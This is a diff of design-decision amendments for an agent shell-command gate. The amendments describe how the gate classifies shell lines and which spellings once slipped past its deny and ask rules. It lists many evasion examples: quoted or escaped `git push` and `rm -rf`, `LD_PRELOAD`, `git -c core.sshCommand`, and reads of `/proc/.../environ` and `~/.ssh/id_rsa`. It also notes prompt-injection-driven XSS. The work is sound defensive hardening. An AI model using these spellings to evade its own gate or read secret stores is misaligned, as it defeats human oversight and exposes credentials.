+  }` is not read at all, so it still asks as `opaque_exec`. A closer heredoc wins over a pipe in on stdin only; the
+  lexer drops fd numbers, so one on another fd (`{ bash; } 3<<EOF`) is read as stdin: its body is fed, and text piped
+  in reaches only the first command inside, so in `echo ... | { true; bash; } 3<<EOF` bash is read with the body, not
+  the pipe it reads. A shell read that way still asks at least, as `bash 3<<EOF` does and as main asks.
+  *Amendment 2026-10-17 (issue #192):* on a line that enters a folder that can hold a secret store, a relative read of
+  a store file is `credentials`. The hints come from the sample store paths, per call: the store folders (a dot folder
+  along a sample below home by its name, a plain one only below its parent, such as `.config/gh`, `.exo/keys` or
+  `/proc`, so a checkout called `exo` is not one) and the store file names. A line enters a store folder when any
+  `cd`, `pushd`, `git -C`, `env -C`, `sudo -D` or `tar -C` target in it, wherever it stands and however it is spelt,
+  has a store folder among its parts (`..` resolved as bash's `cd` does, a brace set or range as its words), or goes by
+  a relative name, also through `..` or after `cd ..`, into a plain store folder below another target (a dot parent by
+  its name, a plain one by its path; a folder entered this way is a parent in turn). On such a line a relative name in
+  its words, redirections, uploads and `$( )`, `<( )` or `bash -c` bodies (not the targets' own words, the program and
+  the words before it except assignments, a `git` subcommand, a jq filter (not `-f`), or prose with a space and no
+  unquoted brace set) counts when its file name is a store file name (a glob, read with bash's bracket and leading-dot
+  rules: when it could match one) or it goes into a store folder; the folder itself (`.`) counts when a target is a
+  store folder, and any relative name when a target is itself a store, a glob target included. A name that goes into a
+  plain store folder from its parent counts on any line when it names a store. Chosen over following the folder per
+  command or per line, which
+  review showed misses shell semantics (`||`, `!`, `time`, a `cd` in `$( )`), grows exponentially on scripts that walk
+  folders and needed caps that failed open or asked on ordinary scripts. This model is linear, and where it bounds
+  work (16 brace words, 64 `cd ..` levels or glob candidates, many `[`) it fails closed. The cost, failing closed:
+  neither the order nor the success of the commands is followed, so a word named like a store file asks on such a line
+  even when it is elsewhere or not a file (`cd ~/.kube && cd ~/project && cat config`,
+  `cd ~/.config/fish && cat config`, `npm config` in `~/.config/nvim`), and `.` asks in a store folder. Lines that
+  enter no store folder and name none are unchanged. A `store_write` line stays `store_write`, the principal's alone.
+  Known limits: a target in a variable or made by a command (`cd $X`), a name made by a command or with a space in it
+  (`cat $(ls)`, `"$(pwd -P)/config"`), a dot store folder named last in an operand (`tar czf x ../.kube`), a relative
+  target taken from another relative one (`cd ~/.config && cd nvim && cd ../gcloud`), a glob in the parent of a plain
+  store folder (`cd /sr?/exo-home && cd keys`), a plain store folder reached from more than one level above its parent
+  (`cd / && cd srv/exo-home/keys`), other `${PWD...}` forms, the text `eval` runs, `cd -` and `OLDPWD`, `CDPATH`,
+  `HOME` set on the line, `dotglob`, and a store reached through a folder link whose name does not say so.
+  *Amendment 2026-10-16 (issue #136):* a `command:` regex in `deny` and `reserved` matched the command text
+  only, so `'git' push`, `g\it push`, `git pu''sh` and `$'rm' -rf` walked past a veto the lexer had already
+  decoded. Those regexes now also match a literal-word view (`_policy_command_view`: the lexer's decoded words,
+  operators kept, shell syntax inside a word escaped, dynamic words and heredoc bodies as placeholders made of
+  control characters, which no literal word renders to), merged through the classifier's existing recursion
+  into `$( )`, backticks, `bash -c`, `eval`, shell stdin and every string literal of code. A non-empty
+  `$"..."` word is read as bash reads it without a catalog, so the line keeps its category, target and the
+  vetoes keyed on them, and adds the `indirection` and `locale translation` signals, so it asks unless
+  opaque_exec is named: with a message catalog and a non-C locale bash runs the translation, and expands
+  `$( )` in it. The line is also decided as opaque_exec and the stricter outcome stands, so a veto on
+  opaque_exec holds for it too. `$"..."` inside `${...}` is left to the parameter-expansion work (#143,
+  #158). A heredoc delimiter spelled `$"EOF"` or `$'EOF'` ends the body on different lines in bash and in
+  dash (the shell tool's fallback when bash is missing), so that body is read as commands too. A `deny` or
+  `ask` rule keyed on `command:` sees the view in a second pass that only raises; the first-match rule is still
+  chosen on the original text. Allow and lower rules and grants match the original text only: the view adds
+  vetoes and never authorizes. Accepted cost, fail closed: a literal that code only prints, and separately
+  quoted data arguments under an unanchored regex, are matched too. The reason names only the policy entry,
+  never the matched words: the hook writes decisions to the signed ledger, which holds no command text.
+  *Amendment 2026-10-17 (issue #179):* bash runs a `$( )` or backticks inside the array subscript of a variable
+  name, even when the name is single-quoted, so `printf -v 'a[$(gh pr comment ...)]' %s x` was `read` (allow). The
+  name arguments of `printf -v`, `read`, `declare`, `typeset`, `local`, `unset`, `test -v`/`[ -v` and `wait -p`
+  are now read for a subscript: each command in it is classified like a `$( )`, and since bash evaluates the
+  command's output (or a variable's value) as arithmetic too, any expansion or quoting there also asks through the
+  `indirection` signal, not an `opaque_exec` part, so a deny on the line's own category still wins. A subscript
+  without expansion and plain names keep their class; a bare name such as `a[i]` is a known limit (GATE.md).
+  The scan finds the `]` that ends the subscript as bash does: a nested `[ ]` counts, and a `\` outside single
+  quotes hides the next character, so `a[\$(cmd)]` reads no command, as bash runs none. In a nested subscript
+  bash before 5.2 runs a `\$( )` again, so the gate reads it there. Past the depth cap a command there is
+  `opaque_exec`, as an unquoted `$( )` is.
+  *Amendment 2026-10-17 (issue #188):* `declare`, `typeset`, `local`, `readonly` and `export` evaluate the value of
+  a `NAME=VALUE` operand again: with `-a` or `-A` a compound value `(..)` is parsed again as words even when quoted
+  (the gate reads it with or without them, which is only stricter), and for the first three a `-i` value is
+  arithmetic and a `-n` value is a name whose subscript bash evaluates when used. So `declare -a 'b=($(gh ...))'`,
+  `export -a 'b=(<(gh ...))'` and `declare -i x='a[$(gh ...)]'` were `read` (allow). Those values are now read with
+  the subscript scan: each `$( )`, backticks or `<( )` in them is classified like a `$( )` and added after the
+  line's own parts, as the line parse adds an unquoted one (so it does not take a tie from a redirection), a
+  `[key]=` is read as a subscript, and a quoted operand after one or more unquoted compound ones is read too. A
+  backslash-newline is dropped from a compound value before it is read, as bash drops it first (an `-i` or `-n`
+  value keeps it, as bash does), and a `$( )` the line's own parse read is not read again, also when it holds a
+  backslash-newline. A body that holds a single quote or a here-document marker (`<<`) anywhere is compared as
+  written: bash keeps a backslash-newline in single quotes or a quoted here-document but not in the value it reads
+  again, and the gate does not track where it is, so with a backslash-newline such a body is read again and asks
+  (`declare -a "b=($(ls 'x' \<newline> -l))"`, only stricter: bash runs the same command). A command the
+  line runs only because bash reads a value again also asks through `indirection`, as does an expansion in a `-i` or
+  `-n` value, in a `-i` element, or in a compound value the line itself expanded. So when such a command outranks
+  the line's own category, a deny on that category became ask, never allow or log
+  (`declare -a 'b=($(sudo ls))' > /tmp/f` under `categories: {local_write: deny}`); D-075 (#126) kept the deny
+  for the `deny:` list form, and the D-075 amendment for #191 (2026-10-19) lifted the `categories` form
+  too, so that line denies now. That command also carries the `reread` signal,
+  and naming `opaque_exec` does not lower its ask, which stands in for the line's own deny:
+  `{local_write: deny, opaque_exec: allow}` asked too, lifted by the D-075 amendment for #191,
+  2026-10-19, to deny; the line denies now. Past the
+  depth limit such a command, or one in a subscript, is an `opaque_exec` part, as on the line itself, with `reread`.
+  A plain expansion in a compound element without `-i` (`'b=("$@")'`) is expanded once and asks nothing, and the
+  unquoted compound form keeps the line parse's reading. readonly and export never evaluate a name's subscript, so
+  their names are not read. A later plain assignment to a `-i` or `-n` variable and values that come whole from a
+  variable stay a known limit (GATE.md).
+  *Amendment 2026-10-17 (issue #160):* wrappers that run a command were unknown or opaque programs, so the command
+  was never classified and a deny on its category asked (`setsid git push origin main`, `flock /tmp/l git push`,
+  `watch git push`, `script -qc '...'`, `tmux new-session -d '...'`, `screen -dm ...`, `parallel git push :::
+  origin`). The gate now reads them as it reads `xargs` (`gate._WRAPPERS`, `_classify_wrapper`): options and fixed
+  operands are skipped as getopt reads them, and the argv or the command string (`flock -c`, `script -c`, `watch`
+  through `sh -c`, a tmux shell-command, a parallel template) is classified as a nested command beside an opaque
+  part, so the line asks as before. Until D-075 lands, the line is denied only when what runs outranks
+  `opaque_exec` (`delete`, `vcs_push`, `credentials`); a category that ties with it or ranks below it
+  (`schedule`; `web_read`, `local_write`) still asks, as for `coproc`. A tmux command list is split as tmux
+  splits it: an argument ending in `;` ends a command, one ending in `\;` does not; tmux's default aliases
+  `splitp` and `split-pane` name `split-window`. An environment dump behind a wrapper is `credentials`, as behind a
+  prefix or runner (#155): the wrapped argv goes through the same `_env_dump` check. `chroot`, `nsenter`, `unshare`
+  and `systemd-run` follow the `sudo` precedent: a signal named after the wrapper, reversible counts as costly. Forms
+  the gate cannot read (a variable, `tmux send-keys`, `screen -X stuff`, `parallel` without a template) stay
+  `opaque_exec`. A deny on `opaque_exec` itself no longer reaches a wrapped command that outranks it, as with
+  `bash -c` and `xargs`, so the line asks there (it was denied) until D-075. To keep that an ask and not the inner
+  category's `log`, this change carries #178's floor rule: only naming `opaque_exec` at `log` or `allow` turns the
+  indirection floor off. A `parallel` template is read per argument only on the line itself (16 distinct
+  arguments, four times that command's own length, each text sized before it is built); a nested one is read
+  alone, so a template that is a parallel line cannot multiply the work. `function NAME {` from the same issue is
+  read by #181.
+  *Amendment 2026-10-17 (issue #167):* the lexer decoded `$'..'` with Python's `unicode_escape`. Bash's short
+  escapes (`\u65`, `\x4`, `\U41`), its 8-bit octal (`\545` is `e`), `\x{..}` and its NUL cut-off differ from that,
+  so `git push $'--forc\u65' origin main` read as a plain push while bash ran a force push. `$'..'` is now decoded
+  by bash 5.2's ANSI-C rules in a UTF-8 locale (`gate._ansi_c`), checked escape by escape against bash. A `\u` or
+  `\U` value that is no character is written as bash's u32toutf8 writes it (up to six bytes that are not ASCII,
+  nothing from 0x80000000 on), so every `$'..'` word is read. Category and target vetoes see the decoded word; a
+  `command:` regex still sees the raw line until the literal-word view (#187) uses the same decoder.
+  *Amendment 2026-10-18 (issue #130):* the store floor resolved the store roots but matched only the lexical
+  normpath of the path written, so a symlink alias into the store (`ln -s ~/.exo/state /tmp/s`, then a write to
+  `/tmp/s/approval-grants.json`) was a local write. `is_store_path` and the `cd` check now compare the union of two
+  spellings, the lexical normpath and the realpath, of both the candidate and each store root. Resolving the
+  original spelling keeps `symlink/..` in filesystem order, and the lexical form keeps a protected entry that links
+  out of the store protected. A path that cannot be resolved (a NUL byte, an unencodable character, a loop) keeps
+  its lexical form, so a resolution failure never weakens a check. `cd`, `pushd` and `git -C` into an alias of the
+  store count as being in the store. Links planted in the same command count as writes to what they alias: `cp -s`
+  and `cp -l` (and their long-option prefixes), and a relative `ln` target read against each absolute folder the
+  link can land in (the last `-t DIR`, the last operand and its parent, with options anywhere on the line). Not
+  done, listed in `docs/GATE.md`: TOCTOU, earlier hardlinks, a protected entry that links out of the store,
+  case-insensitive filesystems, glob spellings, relative link chains and folders, the bash tool's `cwd` argument,
+  and file-descriptor magic links (#217).
+  *Amendment 2026-10-18 (issues #153, #154, #155):* an `ssh`/`mosh` chain past the four-level cap asks as
+  opaque_exec and keeps the first host as target. Options of allowlisted programs whose value is a command
+  (`tar -I`, `rsync -e`, `ssh -o ProxyCommand`, `git rebase -x`, `less +!`, sqlite3 and psql shell escapes,
+  `GIT_SSH_COMMAND=` before the program...) are classified as nested commands, and a value the gate cannot read
+  asks. The options are read as each program's getopt reads them, with the program's own value-taking options
+  and boundaries: a cluster ends at its first value letter (`-oProxyCommand=cmd` is `-o`), and ssh's options
+  end at its remote command (every word is read when one may expand to no word or several, `$A` or `"$@"`). Reading more than getopt would is fail closed, reading less is a bypass, so a table
+  of value-taking options lists only options known to take one. Rejected: scanning every word for option
+  letters (the earlier form of this change), which lost `-oProxyCommand` to a later `o` and asked on `ssh host
+  curl -I URL`. Environment dumps are credentials behind runners and prefixes too (`uv run printenv X`).
+  *Amendment 2026-10-18 (issues #230, #232):* follow-ups to the above. An ssh `-o` keyword the gate cannot read (`-o
+  "$OPT"`, a glob, an unclosed quote an expansion may close) asks as opaque_exec, like any other value in a variable.
+  `git ls-remote --exec`, a hidden synonym of `--upload-pack`, is followed (ls-remote rejects `-u`, which is still
+  read: reading more than git is fail closed). An assignment before a command is any form bash takes (`NAME+=value`,
+  `NAME[i]=value`), so a dump behind one is credentials. tar's `--checkpoint-action` is read in any abbreviation
+  longer than `--checkpoint` (an option of its own, whose optional value must not swallow the next word); `mosh
+  --ssh` in any case and after `+` is read by D-075's mosh reading (#126). Two asks the first change
+  added are dropped, and those lines classify exactly as before it: ssh's `none` value for a command or library
+  setting, which ssh_config documents as switching the setting off (CLEAR_ON_NONE, any case, the bare word only), and
+  a `psql` line starting with `system`, which is mysql's command and SQL in psql.
+  Rejected: keeping them as fail-safe asks, since they are ordinary spellings and the gate's docs never claimed them.
+  *Amendment 2026-10-19 (#231):* a variable set on the line was read only when its value is a command (#154), so a
+  variable that loads code or moves where programs and config files are found was dropped unread: `LD_PRELOAD=/t/x.so
+  ls`, `PATH=/tmp/bin ls` and `HOME=/tmp/h git log` were `read` (allow). *Variables.* The loader variables
+  (`LD_PRELOAD`, `LD_AUDIT`, `LD_LIBRARY_PATH`, `GCONV_PATH`, the `DYLD_*` paths, `OPENSSL_CONF`, `OPENSSL_ENGINES`,
+  `OPENSSL_MODULES`), the lookup and startup variables (`PATH`, `HOME`, `XDG_CONFIG_HOME`, `BASH_ENV`, `ENV`,
+  `ZDOTDIR`, `GIT_EXEC_PATH`, `GIT_TEMPLATE_DIR`, `GIT_CONFIG_GLOBAL`, `GIT_CONFIG_SYSTEM`, the Python, Perl, Ruby
+  and Node module paths and startup files, `PSQLRC`), the option variables (`TAR_OPTIONS`, `NODE_OPTIONS`, `PERL5OPT`,
+  `RUBYOPT`, `MANOPT`, `ZIPOPT`, `RIPGREP_CONFIG_PATH`, `LESS` with a `+` command) and a non-empty `CDPATH` are
+  `opaque_exec`, named in the summary (`gate._EXEC_ENV_OPAQUE`; the list with reasons is in `docs/GATE.md`). That
+  holds wherever the line sets one: before a program, through `env`, `sudo`, `nice` or `timeout`, exported or bare,
+  as a parameter-expansion assignment (`${PATH:=.}`), through `read`, `printf -v`, a `for` loop or a nameref, or as an
+  integer through arithmetic, a subscript or a `{PATH}>` redirection. A name the gate cannot read asks too. More
+  command-valued variables (`GIT_PROXY_COMMAND`, `GH_PAGER`, `PSQL_PAGER`, `SUDO_ASKPASS`, `PROMPT_COMMAND`...) are
+  read as commands under #154's rule. Only text bash expands counts: the lexer records each `${..}` and `$((..))` it
+  expands, read to the `}` bash closes it with, so single-quoted text, a quoted here-doc and a glob bracket never
+  ask. The scan is linear in the line (brace, bracket and paren pairs are each found in one pass, a nested value
+  longer than 64 characters stands in its parent's value as `${_}`), because classify runs inside the gate hook:
+  the first form re-read the line for every unclosed `${NAME:=` and took 145 s for 64 KB. *One git config check.*
+  `_git_config_kind` reads a key the same way wherever it is set: `git -c`, `git config`, `git clone -c` or
+  `--config`, `git --config-env` (attached or not), `GIT_CONFIG_KEY_<n>`/`GIT_CONFIG_VALUE_<n>` and
+  `GIT_CONFIG_PARAMETERS`. The value of an exec key is classified as a command, so a category deny fires on it
+  (`git clone -c core.sshCommand='rm -rf ...'` is `delete`); a key that loads another config file or a template
+  (`include.path`, `includeIf.*.path`, `init.templateDir`) asks, as do `git clone --template` and `git init
+  --template`. `git config` is read as git reads it: its subcommand (`set`, `get`...) and the values of `-f`, `-t`,
+  `--file`, `--blob`, `--type`, `--default`, `--comment`, `--value` and `--url` are not the key, also under any
+  unique prefix git accepts for a long option (`--fil`, `--ty`, `--rename-sec`), a value set for an
+  exec key is classified as the command it is, and `rename-section` asks (it can turn `x.path` into
+  `include.path`). The exec keys also cover any key whose last part ends in `command` or `cmd`,
+  `interactive.diffFilter`, `remote.<name>.uploadpack`/`receivepack` and a difftool, mergetool, man or browser
+  `.path`; and a switch that lets git run an `ext::` URL asks (`protocol.allow`, `protocol.ext.allow`, an `ext::`
+  `insteadOf` rewrite, a remote URL that starts with `ext::`, `GIT_ALLOW_PROTOCOL`). *env and sudo.*
+  Both read `NAME=VALUE` from their own argv, quoted or not, so a quoted one after them is read as the assignment it
+  is: the variable is checked, and the rest is the command it is (`env 'FOO=a b' ls` is `ls`, where it was an
+  unknown program; `env 'X=1' rm -rf /srv/data` is `delete`). After `nice`, `timeout` and the other prefixes a
+  quoted `NAME=VALUE` is still the program, as the shell runs it. Left out: `IFS`, which does not change how
+  literal words split. `PS4` is read as a command-valued variable, as the double-quoted text bash expands before
+  every traced command (`set -x` needs no interactive shell, unlike `PROMPT_COMMAND`; #168 scrubs an inherited one
+  for the same reason). Arithmetic assigns with `++`, `--` and `<<=`/`>>=` too. Known limits (rarer expansion forms
+  that can still set a variable unseen) are listed in `docs/GATE.md`. *Cost, and what stays allowed.* A line that
+  sets one of these variables asks where it was allowed, except for values that change nothing the gate relies on:
+  an empty loader variable, `GIT_CONFIG_GLOBAL`/`SYSTEM` set to `/dev/null`, a `PATH` of `$PATH` and folders the
+  gate already trusts a program from by path (system bin folders, a virtualenv's `bin`, `node_modules/.bin`), and
+  `PYTHONPATH` before `pytest` or `python -m pytest`, which already run the project's code. `$PATH` counts as the
+  current value only where bash expands it: an assignment whose source holds single quotes, `$'..'` or a backslash
+  gets no PATH exemption, since there `$PATH` can be a folder of that name (`export PATH='$PATH:/usr/bin'`).
+  Deliberate asks: an empty `PATH` element (the current folder), a folder written with `..` (resolved through
+  links, not lexically), any other `PATH` folder, appended or not, since it supplies every program the earlier
+  folders lack (`export PATH="$HOME/.local/bin:$PATH"`), and `PYTHONPATH` before any other program or exported. Rejected: exempting any append-only `PATH`, which lets a planted program stand in for one the
+  gate trusts by name but the machine lacks.
+  *Amendment 2026-10-19 (issues #209, #202, #225, #199):* four spellings reached a secret store without its name,
+  and the gate read them as plain reads. A link is judged by where it leads: a path is resolved from the gate's own
+  folder, from the session's working folder (the core passes it to tool hooks as `cwd`; each hook gets only the
+  keywords it declares) and, for a shell tool, from that folder joined with the call's own `cwd` argument (a file
+  tool ignores that argument, so the gate does too), and a resolved path a link led to is matched by name; a relative path that
+  stays below its folder is matched by its part there, so a session in a repo's `.claude/worktrees` checkout is not
+  asked about every link. A `.pub` name exempts only a path that resolves to one. `${VAR:-word}` and the other
+  operators of `HOME`, `EXO_HOME`, `CLAUDE_CONFIG_DIR` and `EXO_PRINCIPAL_STORE` are read with the value and with the
+  default; both count. A shell word with a `$( )`, a backtick pair or an unknown variable is also matched with each
+  one empty, and with each one between two literal parts read as `*`. A glob is read in bash's bracket syntax
+  (`[^x]`, POSIX classes), and `/proc/<pid>/<glob>` is matched against `environ` (a thread's
+  `/proc/<pid>/task/<tid>/<glob>` too since the #313 amendment below, 2026-10-21). Rejected: treating every
+  expansion inside a word as opaque, which would ask on `cat notes-$(date +%F).md`; refusing links in `read_file`
+  alone, which leaves the shell open. The checks of one classify call share their file-system lookups, which made a
+  10 KB line several times faster. Limits in `docs/GATE.md` "Other spellings of a store path".
+  *Amendment 2026-10-19 (issues #207, #240):* two programs the gate skipped are read. bash takes a compound opener
+  after `coproc NAME` as a reserved word only when the two tokens before it are `coproc` and the name, so a
+  redirection, heredoc or here-string between them gives a simple command that runs the name (`coproc rm >/dev/null
+  { -rf x` deletes); the lexer marks a word followed by one, and the gate then reads the name as the program too,
+  beside the skipped reading, which stays so nothing it denied is lost. With no remote command, the login shell
+  `ssh host` starts runs ssh's stdin; a piped, heredoc or here-string text is read as shell, as for `bash -s`, and
+  the line asks, with the parts `internal` (D-075). ssh's options after the host are read up to the remote command;
+  `-n`, `-N`, `-f` or a remote command keep the old reading, and a word that may expand to no word or several before
+  the command, or as all of it, reads the stdin too (fail closed). As with wrappers, the line takes the category of
+  what runs, but the old reading stays a part: `deny` and `reserved` entries see every part (D-075), and since #191
+  (#306) so does a `categories:` setting or rule that denies (`opaque_exec` for the coproc lines, `shell` or the host
+  as target for ssh), so these lines are denied as before. Rejected: reading both coproc readings whenever
+  the line has any redirection (the issue's first sketch), which reads the name as a program in `coproc rm { echo
+  >/dev/null hi; }`, where bash runs a named compound.
+  *Amendment 2026-10-20 (issue #334, follow-up to #231):* #231 reads values bash runs later as code, and a nest of
+  `$(` in one cost about n**4. Each `$( )` is listed at every level above it and classified there again, and nothing
+  bounded the depth, so 40 levels in `PROMPT_COMMAND` took 15 s, and from about 500 levels the lexer's recursion
+  raised RecursionError. The hook then asked for the whole line, so a deny on a command after the value became an
+  ask. *Read once.* One top-level classify_shell call parses each line once and classifies it once per depth and
+  state of the brace and store budgets (`_shell_seen`). The budgets only fall, so a line met again after one fell is
+  read again and spends it again: every line classifies as before, budget refusals included. A caller gets its own
+  copy of the result and shares the parts it was built from (D-075). The ssh hop, the only caller that changes parts
+  in place, marks a copy. `decide` scopes and walks each part once, also a part the memo shares among several
+  results, so it stays linear in the line too. *A depth cap.* A lexer reads 16 levels of `$( )`, `<( )` and `$(( ))`
+  inside one another (`_NEST`). Past them `_nest_end` finds where the nest ends as the lexer would end it, in one
+  pass with a stack of open parts and no here-doc body read again, and the line lists an unread part (`opaque_exec`,
+  signal `unread nest`). An exported value keeps that part, where export drops other values it cannot read. The
+  sources of the levels around hold a short stand-in, so classifying them never reads the deep text again, and a word
+  keeps the text the lexer would give it. On 80,000 random texts (3,000 in the test) `_nest_end` ends where the lexer
+  ends and leaves the same here-docs waiting. On a wider set it still ends there, but a delimiter word holding
+  `$(cat <<X ...)` can leave a here-doc waiting for other text, since the lexer reads that `$( )` as its body. Each
+  level around the unread part pairs every here-doc with its end line, also when the delimiter holds that part,
+  quoted or not (the line is spelt the way the level reads the delimiter) or the body lies inside it (the stand-in
+  ends the body), so a command after the here-doc is still read. A run of stand-in lines, one written by hand too, is
+  read in one step, and a command after it is still read. The cost: a command inside the unread part is not read, so
+  a deny on it asks, and a here-doc delimiter there longer than 1,024 characters ends no body. With a nested `${..}`
+  that holds a `$( )` (#143), a deny after the nest can ask too. *git -c (#335).* #231 widened the keys `git -c`
+  flags and kept the early return that made the whole line opaque for one, so
+  `git -c include.path=/dev/null push --force origin main` asked where the gate before #231 denied it. A flagged
+  key's part now stands beside the subcommand's own category (`_exec_options` already added it), and only an unknown
+  subcommand, which the config may define, is opaque on its own. `git config` with a flagged key keeps its
+  `local_write` part. Rejected: reading a nested `$( )` only from the level that holds it (each level classified
+  once), which would put a `$( )` five levels down past the four-level cap and turn its deny into an ask. Also
+  rejected: a scan that follows only quotes and parentheses to the end of the nest, which a quote in a comment or a
+  here-doc body leads past the end, past a deny-listed command.
+  *Amendment 2026-10-21 (issue #313, follow-up to #199):* on Linux each thread's `/proc/<pid>/task/<tid>/environ`
+  holds the same environment as `/proc/<pid>/environ`, another process's included. The store list named only the
+  direct form, so `cat /proc/self/task/1/environ` and `read_file` on it were plain reads. The store list now names
+  the `task/<tid>/` form too. The #199 glob check reads `/proc/<pid>/<x>/<tid>/<glob>` as a thread's file when `<x>`
+  could match `task` and the glob could match `environ`, so `cat /proc/1/*/*/environ` and
+  `cat /proc/self/[t]ask/*/environ` ask. Other files under `task/` keep their class (`cat /proc/self/task/*/status`).
+  The search tools leave a thread's `environ` out of a walk, as they leave out the direct form (#241).
+  *Lowered lines.* A thread's environment is decided as `/proc/<pid>/environ` already was, so some lines decide
+  lower than before. A differential of main against the change ran 27,708 actions under 95 policies: the
+  differential's own set, plus task-environ lines, compound lines and file-tool calls, and 19 more policies (a
+  `read` deny, `reserved: [read]`, `/proc` targets, more matrix cells). It found 2,877 lowered pairs on 1,364
+  actions. Each one decides as main decides the same action with `/proc/self/environ`. Four groups, all from how
+  the gate already handles any secret store: (1) A file tool on a store takes the `credentials` class in place of
+  its own, so a deny on `read` or `local_write` (a category line, a `deny:` entry, a rule, a matrix cell) becomes
+  the credentials ask (`read_file /proc/self/task/1/environ` under `categories: {read: deny}`). A `reserved: [read]`
+  entry no longer matches the call. It still asks, and no grant covers it, since it is `credentials`. A shell line
+  keeps the read as a part (D-075), so a `read` deny still denies `cat`. (2) The matrix sees the dominant part only.
+  A credentials line is costly and private and takes the strongest reversibility of its parts, so a deny cell for a
+  read, or for another part of a compound line, no longer applies
+  (`cat /proc/self/task/1/environ; git push --force origin main` under an `irreversible`, `internal` deny cell
+  asks). (3) Before #396 the posting rules checked the dominant part, so a post beside the read lost its listed
+  violations. They now read every post (D-075 amendment, #396), so it keeps them, named after its part. The
+  line asks either way. (4) A line's credentials target is the first store it names and a `cat` part has no target, so a
+  `target:` entry for a second store on the line no longer matches
+  (`cat /proc/self/task/1/environ; cat ~/.ssh/id_rsa` under `deny: [target:*/.ssh/*]` asks, as
+  `cat ~/.aws/credentials; cat ~/.ssh/id_rsa` already does). The differential does not count a fifth change,
+  because the outcome stays an ask. (5) Beside a store write the line is `credentials`, not `store_write`. A seat
+  that `approvals.yaml` delegates `credentials` to may then answer what only the principal answered
+  (`cat /proc/self/task/1/environ; echo x > ~/.exo/policies/gates.yaml`). Main does the same for any secret on
+  the line (`env; echo x > ~/.exo/policies/gates.yaml`). Rejected: keeping a file tool's own class as a part,
+  as D-075 does for shell lines. It would keep group 1 denied, but it changes every file-tool call on a store
+  (`read_file ~/.ssh/id_rsa` under `categories: {read: deny}` asks on main), so it is a follow-up, as are matrix
+  cells, posting checks and `target:` entries on every part, and a store write that keeps the principal's answer
+  beside a secret. Limits: a doubled slash or a `..` inside a store name is matched as written, so
+  `cat /proc/1/task/1//environ` and `read_file /proc/1/task/1//environ` stay reads, as `cat ~/.kube//config` does
+  on main. A glob in the `/proc` name itself is not read, for either form (`cat /pro?/self/task/1/environ`,
+  `cat /pro?/self/environ`).
 
 ## D-039 (2026-10-12) Approval identity from the connection; web token on every route; one secret scrub
 - **Why:** the 2026-10-12 audit. (a) `approval.respond` took the answerer from its body: an empty `client` meant
@@ -790,6 +1371,15 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   in `<socket stem>.principal.key` beside the socket (0600, in the 0700 run folder), new per launch, deleted on
   stop, never in an environment variable. Clients that are the principal (`exo`, joined windows, `exo chat`, the
   web) read it per request, so they re-join a restarted core.
+  *Amendment 2026-10-17 (bus ingress):* a third caller, `channel`, for the channels exod runs. `serve()` hands them
+  `ChannelLink`, which runs their commands in process and stamps `channel`. No transport ever stamps it. `peers`
+  action `bus` (D-040) pins a seat's key on first sight, and it now takes only this caller, so a tool subprocess on
+  the socket cannot pin an unseen seat to its own key and speak as that seat. Rejected: requiring the principal.
+  The channel was a local socket client, so every first message from a new seat would be refused and trust on
+  first use would end. Also rejected: a leader-signed pin, which needs a leader key the principal pinned, and no
+  home has one by default. A same-user process that writes `keys/registry.json` directly stays out of scope (D-040
+  "Not covered"). The bus seat registry, `$EXO_HOME/bus/registry.json`, is not yet a store path, so a plain `cp` to
+  it is not asked about (#210).
 - **Decision, approvals:** a principal connection answers as the principal (`client` is a label: `by` is
   `principal:tui`). A local connection answers only as `seat:<name>` with the D-033 signature, and never with
   `allow_always`. `approver_identity` returns `unknown` for an empty or unrecognised name, and `unknown` may not
@@ -800,22 +1390,119 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   `[::1]:<port>`, for the page too. Origin and Sec-Fetch-Site checks stay. Only the page shell is served without
   the token. The token stays per launch, in memory, delivered in the URL fragment that `exo web` prints and opens.
   `asgi.py` is deleted (unused).
+  *Amendment 2026-10-17 (issue #162):* the page builds every node with `h()` and text nodes, and that discipline
+  was the only XSS defence, while every `ui` Markdown panel (and, with #149, every completed reply) goes through
+  `markdown.js`: one renderer slip would be a stored XSS reachable by prompt injection, holding the page token. Every
+  response the web server writes (page, static files, JSON, both event streams, errors) now carries one policy,
+  `server.CSP`: `default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'; connect-src 'self';
+  object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'`, with
+  `X-Content-Type-Options: nosniff` and `Referrer-Policy: no-referrer`. It is the issue's draft narrowed to what
+  the page uses: no WebSocket (fetch and EventSource only, so `connect-src 'self'`), no images from `data:`, no
+  fonts, and no native form posts (every form is handled in script). No `'unsafe-inline'`, `'unsafe-eval'`, hash
+  or nonce: the page had no inline script, and its few computed sizes (gauges, bars, the task board) now go
+  through the CSSOM (`el.style.cssText` in `h()`), which the policy does not block, instead of a `style`
+  attribute, which it does. Rejected: a `<meta>` policy (cannot set `frame-ancestors`, and misses the JSON and
+  stream responses); `'unsafe-inline'` for styles (would let injected markup restyle the page into a lure).
+  `docs/ui/WEB.md` "Content-Security-Policy".
 - **Decision, environment:** one function, `exo.envscrub.scrub_env`, for bash, jobs and `code_find`: catalog
   `key_env` names, secret suffixes and words, `AWS_*`, `GH_*`, `GITHUB_TOKEN`, `*DATABASE_URL`, `*_DSN`, the bus
   identity, the core socket and credential variables, and a new seat `[tools] env_deny` (names or patterns).
   `env_allow` keeps a name; `env_deny` wins. The claude-cli child gets `minimal_env` (PATH, HOME, locale, terminal,
   CLAUDE_CONFIG_DIR, proxies, CA bundles) plus its switches.
+  *Amendment 2026-10-16 (issue #135):* the scrub also drops inherited shell startup hooks (`envscrub.EXEC_HOOKS`):
+  `BASH_ENV`, exported functions (`BASH_FUNC_<name>%%`), `SHELLOPTS` and `BASHOPTS`, which bash itself acts on at
+  startup; `ENV`, which an interactive POSIX shell the command starts reads; and `PS4`, which matters once xtrace is
+  on (bash expands it before every traced line, so a `$(...)` in it runs a command). They are a separate exact-case
+  set, not secret names: `is_secret_name` case-folds and also classifies URL query keys and CLI diagnostics, so
+  `ENV=dev` or `?env=staging` must not count as a credential. The same `env_allow` (exact) and `env_deny` precedence
+  applies. The bash tool and background jobs start bash as `bash --norc -c`: with `SSH_CLIENT` or `SSH2_CLIENT` set
+  and `SHLVL` unset or 0, a plain `bash -c` (in many builds) sources `~/.bashrc`, a file the default
+  gate lets a tool call write, and skips an allowed `BASH_ENV`; `--norc` stops the first and still honours the
